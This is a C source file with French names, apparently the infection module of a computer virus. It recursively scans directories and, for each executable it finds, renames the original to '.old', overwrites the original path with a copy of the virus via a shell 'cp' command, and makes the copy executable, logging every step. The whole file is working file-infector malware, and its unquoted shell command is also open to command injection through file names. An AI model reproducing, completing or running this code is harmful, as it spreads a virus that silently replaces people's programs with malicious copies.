//
// Created by armotik on 24/03/25.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>

#include "infection.h"
#include "detection.h"
#include "scanner.h"

int infecter_fichier(const char *cible, const char *chemin_virus) {
    char log_entry[2048];
    snprintf(log_entry, sizeof(log_entry), "Analyse de : %s", cible);
    ecrire_log(log_entry);

    if (!est_executable_regulier(cible)) {
        snprintf(log_entry, sizeof(log_entry), "   └─ [IGNORÉ] Non exécutable ou non régulier.");
        ecrire_log(log_entry);
        return -1;
    }

    if (est_deja_infecte(cible)) {
        snprintf(log_entry, sizeof(log_entry), "   └─ [IGNORÉ] Déjà infecté.");
        ecrire_log(log_entry);
        return -2;
    }

    char chemin_old[MAX_PATH_LEN];
    snprintf(chemin_old, sizeof(chemin_old), "%s.old", cible);

    if (rename(cible, chemin_old) != 0) {
        snprintf(log_entry, sizeof(log_entry), "   └─ [ERREUR] Échec du renommage vers %s", chemin_old);
        ecrire_log(log_entry);
        return -3;
    }

    char commande[3 * MAX_PATH_LEN];
    snprintf(commande, sizeof(commande), "cp \"%s\" \"%s\"", chemin_virus, cible);
    if (system(commande) != 0) {
        snprintf(log_entry, sizeof(log_entry), "   └─ [ERREUR] Échec de la copie du virus.");
        ecrire_log(log_entry);
        return -4;
    }

    if (chmod(cible, 0755) != 0) {
        snprintf(log_entry, sizeof(log_entry), "   └─ [ERREUR] Impossible de rendre %s exécutable.", cible);
        ecrire_log(log_entry);
        return -5;
    }

    snprintf(log_entry, sizeof(log_entry), "   └─ [OK] Infection réussie : %s", cible);
    ecrire_log(log_entry);
    return 0;
}


void explorer_et_infecter(const char *path, const char *chemin_virus) {
    DIR *dir;
    struct dirent *entry;
    char chemin_complet[MAX_PATH_LEN];
    struct stat st;

    dir = opendir(path);
    if (!dir) {
        fprintf(stderr, "[!] Impossible d'ouvrir %s : %s\n", path, strerror(errno));
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(chemin_complet, sizeof(chemin_complet), "%s/%s", path, entry->d_name);

        if (stat(chemin_complet, &st) != 0) {
            perror("[!] Erreur stat");
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            // Appel récursif (pour explorer les sous-répertoires)
            explorer_et_infecter(chemin_complet, chemin_virus);
        } else if (est_executable_regulier(chemin_complet) && !est_deja_infecte(chemin_complet)) {
            infecter_fichier(chemin_complet, chemin_virus);
        }
    }

    closedir(dir);
}

void ecrire_log(const char *message) {
    FILE *logfile = fopen("log.txt", "a");
    if (!logfile) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    fprintf(logfile, "[%04d-%02d-%02d %02d:%02d:%02d] %s\n",
        t->tm_year + 1900,
        t->tm_mon + 1,
        t->tm_mday,
        t->tm_hour,
        t->tm_min,
        t->tm_sec,
        message);

    fclose(logfile);
}
